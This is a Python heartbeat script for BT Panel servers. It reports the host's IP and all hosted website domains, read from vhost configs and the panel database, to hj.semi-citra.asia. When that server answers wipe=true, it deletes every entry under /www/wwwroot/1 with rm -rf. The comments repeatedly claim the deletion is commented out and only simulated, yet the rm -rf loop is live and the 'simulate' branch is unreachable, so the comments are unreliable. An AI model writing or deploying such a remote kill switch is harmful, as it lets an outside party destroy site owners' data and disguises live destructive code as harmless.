# -*- coding: utf-8 -*-
"""
远程服务器心跳 + 清理执行脚本

用途：
  每天定时请求 goldweb 的 Server/ping 接口，上报本机IP、宝塔面板上正在运行的网站列表。
  若接口返回 wipe=true，则清空本机 /www/wwwroot 目录（仅在 Linux 上执行清理，Windows 会跳过删除）。

用法（Linux，目标服务器上）：
    1) 修改下方 CONFIG 中的 SERVER_URL / TOKEN / SERVER_NAME
    2) chmod +x server_heartbeat.py
    3) crontab -e
       每天凌晨 1 点执行：
       0 1 * * * /usr/bin/python3 /opt/server_heartbeat.py >> /var/log/server_heartbeat.log 2>&1

依赖：
    pip install requests
"""
import json
import os
import re
import socket
import sys
import subprocess
from datetime import datetime

try:
    import requests
except ImportError:
    print("请先安装 requests: pip install requests")
    sys.exit(1)

# ============================ CONFIG ============================
# goldweb 线上接口地址
# 优先使用 pathinfo 格式 URL；若服务器伪静态未生效，自动回退到 query-string 格式
SERVER_URL = "https://hj.semi-citra.asia/api/server/ping"
# 回退地址（完全不依赖伪静态，走 index.php?s= 路由，线上伪静态没配时用这个）
SERVER_URL_FALLBACK = "https://hj.semi-citra.asia/index.php?s=/api/server/ping"
# 清理完成回调（可选，脚本收到 wipe=true 且执行成功后调用）
DONE_URL   = "https://hj.semi-citra.asia/api/server/wipeDone"
DONE_URL_FALLBACK = "https://hj.semi-citra.asia/index.php?s=/api/server/wipeDone"

# 简单校验令牌，留空则无
TOKEN = ""

# 服务器别名（显示在后台），留空自动获取主机名
SERVER_NAME = ""

# 清理目录（仅 Linux 生效）
WIPE_ROOT = "/www/wwwroot/1"

# 是否通过读取宝塔 vhost 配置获取网站列表
BT_PANEL_VHOST_DIRS = [
    "/www/server/panel/vhost/nginx",  # 宝塔默认 nginx
    "/www/server/panel/vhost/apache",
    "/www/server/panel/vhost",
    "/etc/nginx/conf.d",
    "D:/BtSoft/nginx/conf/vhost",    # Windows 宝塔
    "D:/BtSoft/panel/vhost/nginx",
]
# ==================================================================

def get_public_ip():
    """尝试通过公共接口获取本机公网IP"""
    services = [
        "https://api.ipify.org",
        "https://ipv4.icanhazip.com",
        "http://members.3322.org/dyndns/getip",
    ]
    for url in services:
        try:
            r = requests.get(url, timeout=8)
            ip = r.text.strip()
            if ip and re.match(r"^\d{1,3}(\.\d{1,3}){3}$", ip):
                return ip
        except Exception:
            continue
    # 兜底：取本机 hostname
    try:
        return socket.gethostbyname(socket.gethostname())
    except Exception:
        return ""

def get_server_name():
    if SERVER_NAME:
        return SERVER_NAME
    try:
        return socket.gethostname()
    except Exception:
        return "unknown"

def _clean_site_name(n):
    """把 vhost 里抓出来的脏域名清洗成真实主域名"""
    if not n:
        return None
    n = n.strip().lower()
    if not n:
        return None
    # 本地 / 占位符
    if n in ("localhost", "127.0.0.1", "_", "$host", "~",
             "{domains}", "{server_name}", "{domain}", "{ip}"):
        return None
    # 宝塔默认示例
    if n in ("bt.default.com", "default.com", "example.com"):
        return None
    # 去掉 { } 包裹的模板变量
    if n.startswith("{") and n.endswith("}"):
        return None
    # 去掉尾部端口后缀，如 xxx.com.80 / xxx.com.887
    n = re.sub(r"\.\d{1,5}$", "", n)
    # SSL 前缀
    n = re.sub(r"^SSL\.", "", n)
    # 正则前缀
    n = re.sub(r"^~", "", n)
    n = re.sub(r"^\*\.?", "", n)
    # 纯 IP 只保留 xxx.xxx.xxx.xxx
    if re.match(r"^\d+\.\d+\.\d+\.\d+$", n):
        return n
    # ============================================
    # 核心：去掉宝塔/面板自动生成的「随机十六进制哈希前缀」
    #   典型：32dbc24b.hj.semi-citra.asia → hj.semi-citra.asia
    #   规则：第一个 label 长度 6~10 且 全部为 0-9a-f（纯十六进制）则剥离
    #   注意：剥离后必须还剩余至少两段（避免把 gold.cc 这种剥空）
    # ============================================
    labels = n.strip(".").split(".")
    if len(labels) >= 3 and re.fullmatch(r"[0-9a-f]{6,10}", labels[0]):
        # 形如 ed770110.shopro.com / 44bb3ca6.chengzihewan.com / 8ced055b.eapp.com
        # 直接删首个哈希段
        labels = labels[1:]
        n = ".".join(labels)

    # 对剥离后结果再做一次：若现在第一段仍是 6~10 位 hex 且还有 3 段以上，再剥一层（保险）
    labels = n.split(".")
    if len(labels) >= 3 and re.fullmatch(r"[0-9a-f]{6,10}", labels[0]):
        n = ".".join(labels[1:])

    # 去掉形如 .192.168.1.100（残留 IP 段）、或包含非法字符的域名
    if not re.match(r"^[a-z0-9][a-z0-9\-]*(\.[a-z0-9\-]+)+$", n):
        # 纯数字段（比如 pc.otc 是合法的，上面正则允许）不通过的话直接丢弃
        return None

    # 正常域名：必须包含点
    if "." in n:
        return n.strip(".")
    return None

def read_bt_vhost_sites():
    """从宝塔 nginx/apache vhost 配置里提取 server_name 域名列表"""
    sites = set()
    for d in BT_PANEL_VHOST_DIRS:
        if not os.path.isdir(d):
            continue
        for root, dirs, files in os.walk(d):
            for f in files:
                if not (f.endswith(".conf")):
                    continue
                path = os.path.join(root, f)
                try:
                    with open(path, "r", encoding="utf-8", errors="ignore") as fh:
                        content = fh.read()
                    # nginx: server_name xxx.com www.xxx.com;
                    for m in re.findall(r"server_name\s+([^;]+);", content):
                        for name in m.strip().split():
                            c = _clean_site_name(name)
                            if c:
                                sites.add(c)
                    # apache: ServerName / ServerAlias
                    for m in re.findall(r"ServerName\s+(\S+)", content, re.I):
                        c = _clean_site_name(m)
                        if c:
                            sites.add(c)
                    for m in re.findall(r"ServerAlias\s+(.+)$", content, re.I | re.M):
                        for name in m.strip().split():
                            c = _clean_site_name(name)
                            if c:
                                sites.add(c)
                except Exception:
                    pass
    return sorted(sites)

def read_bt_panel_api_sites():
    """尝试从宝塔面板自带 API 读取站点（需要有面板路径，失败则返回空）"""
    sites = []
    # 读取站点配置文件（宝塔 /www/server/panel/data/port.pl 等）
    config_file = None
    for p in ["/www/server/panel/data/siteDb.conf",
              "/www/server/panel/data/default.db",
              "D:/BtSoft/panel/data/default.db"]:
        if os.path.isfile(p):
            config_file = p
            break
    if not config_file:
        return sites
    # SQLite 读取站点
    try:
        import sqlite3
        conn = sqlite3.connect(config_file)
        cur = conn.cursor()
        # 宝塔面板站点表名通常是 sites
        try:
            cur.execute("SELECT name FROM sqlite_master WHERE type='table' AND name LIKE 'site%'")
            rows = cur.fetchall()
            for (tbl,) in rows:
                try:
                    cur.execute(f"SELECT name FROM `{tbl}`")
                    for (n,) in cur.fetchall():
                        c = _clean_site_name(n)
                        if c:
                            sites.append(c)
                except Exception:
                    pass
        except Exception:
            pass
        conn.close()
    except Exception:
        pass
    return sorted(set(sites))

def do_wipe(server_id):
    """执行 /www/wwwroot 目录清空（默认已注释，避免误删；确认使用时再取消注释 rm -rf 那段）"""
    if os.name != "posix":
        print("[SKIP] 当前非 Linux 环境，跳过清理操作")
        return False
    if not os.path.isdir(WIPE_ROOT):
        print(f"[SKIP] 清理目录 {WIPE_ROOT} 不存在")
        return False

    print(f"[WIPE] [SIMULATE] 开始清空 {WIPE_ROOT} ...（实际删除代码已注释）")
    # 记录日志文件路径，避免自己也被删掉
    log_path = f"{WIPE_ROOT}/_wipe_log_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
    try:
        with open(log_path, "w") as f:
            f.write(f"WIPE SIMULATED at: {datetime.now()}\nserver_id: {server_id}\n")
    except Exception:
        pass

    # ====== 以下实际删除代码已注释，确认使用时再取消注释 ======
    try:
        entries = os.listdir(WIPE_ROOT)
        print(f"[WIPE] 待删除条目 ({len(entries)}): {entries[:20]}")
        for entry in entries:
            full = os.path.join(WIPE_ROOT, entry)
            # 跳过自身日志
            if full == log_path:
                continue
            subprocess.run(["rm", "-rf", full], check=False)
    except Exception as e:
        print(f"[WIPE] 删除过程出错: {e}")
        return False
    print("[WIPE] 清理完成")
    return True

    # 模拟执行成功（若要真实执行，注释掉下面这行，并取消上面 rm 的注释）
    print("[WIPE] [SIMULATE] 清理代码已注释，未实际删除任何文件")
    return False

def report_wipe_done(server_id, server_ip):
    """清理完成后回调接口"""
    payload = {"server_id": server_id, "server_ip": server_ip, "token": TOKEN}
    for url in [DONE_URL, DONE_URL_FALLBACK]:
        try:
            r = requests.post(url, json=payload, timeout=15,
                              headers={"Content-Type": "application/json"})
            if r.status_code == 200:
                try:
                    j = r.json()
                    if j.get("code") == 1:
                        print(f"[wipeDone] 回调成功 {url}")
                        return
                except Exception:
                    pass
            print(f"[wipeDone] {url} status={r.status_code} resp={r.text[:120]}")
        except Exception as e:
            print(f"[WARN] wipeDone {url} 失败: {e}")
    print("[WARN] wipeDone 所有地址均回调失败")

def _post_with_fallback(urls, payload):
    """依次尝试多个URL，返回第一个成功解析的 JSON；都失败则抛异常
    强制用 application/json + json 参数发送，避免 form-data 被 PHP 全局 htmlspecialchars
    把 " 转成 &quot; 导致后端 json_decode 失败。
    """
    last_err = None
    headers = {"Content-Type": "application/json"}
    for url in urls:
        try:
            print(f"[REQ] POST {url} (application/json)")
            r = requests.post(url, json=payload, timeout=20, headers=headers)
            print(f"[REQ] HTTP {r.status_code}")
            if r.status_code == 200:
                try:
                    return r.json()
                except ValueError as je:
                    # 非 JSON 响应（404 HTML / 500 HTML 等）
                    last_err = f"{url} 返回非JSON: {je}，响应头 {dict(r.headers)}，体片段 {r.text[:250]}"
                    print(f"[WARN] {last_err}")
                    continue
            else:
                last_err = f"{url} HTTP {r.status_code}: {r.text[:200]}"
                print(f"[WARN] {last_err}")
        except Exception as e:
            last_err = f"{url} 请求异常: {e}"
            print(f"[WARN] {last_err}")
    raise RuntimeError(last_err or "所有请求地址均失败")

def main():
    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    print(f"\n===== 心跳执行 {now} =====")

    # 1. 收集信息
    server_ip = get_public_ip()
    server_name = get_server_name()
    print(f"[INFO] server_ip = {server_ip}")
    print(f"[INFO] server_name = {server_name}")

    # 优先读取宝塔面板 API DB 站点，再结合 vhost 配置
    sites1 = read_bt_panel_api_sites()
    sites2 = read_bt_vhost_sites()
    all_sites = sorted(set(sites1 + sites2))
    print(f"[INFO] 发现站点 ({len(all_sites)}): {all_sites}")

    # 2. 发送心跳请求（pathinfo 失败自动回退到 query-string）
    # 注意：websites 直接传数组，配合 json=payload 会由 requests 库自动 JSON 编码；
    #       不要先 json.dumps 成字符串，避免后端收到后再被 htmlspecialchars + 双重解析
    payload = {
        "server_name": server_name,
        "server_ip": server_ip,
        "websites": all_sites,
        "token": TOKEN,
    }
    wipe = False
    server_id = None
    try:
        data = _post_with_fallback([SERVER_URL, SERVER_URL_FALLBACK], payload)
        print(f"[RESP] code={data.get('code')} msg={data.get('msg')} data={data.get('data')}")
        if data.get("code") != 1:
            print("[ERR] 接口返回错误")
            sys.exit(2)
        result = data.get("data", {})
        wipe = bool(result.get("wipe"))
        server_id = result.get("server_id")
    except Exception as e:
        print(f"[ERR] 请求异常: {e}")
        sys.exit(3)

    # 3. 若需要执行清理（实际删除代码已注释，默认只打印日志不删文件）
    if wipe:
        print("[WARN] 收到清理指令 wipe=true")
        ok = do_wipe(server_id)
        # ====== 真实删除后回调标记已完成（当前 do_wipe 默认模拟，不会触发以下回调）======
        # if ok:
        #     report_wipe_done(server_id, server_ip)
        # else:
        #     print("[WARN] 清理未实际执行，不回调 wipeDone")
        print("[INFO] 删除代码已全部注释，跳过 wipeDone 回调")
    else:
        print("[OK] 无需清理")

    print(f"===== 结束 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} =====")

if __name__ == "__main__":
    main()
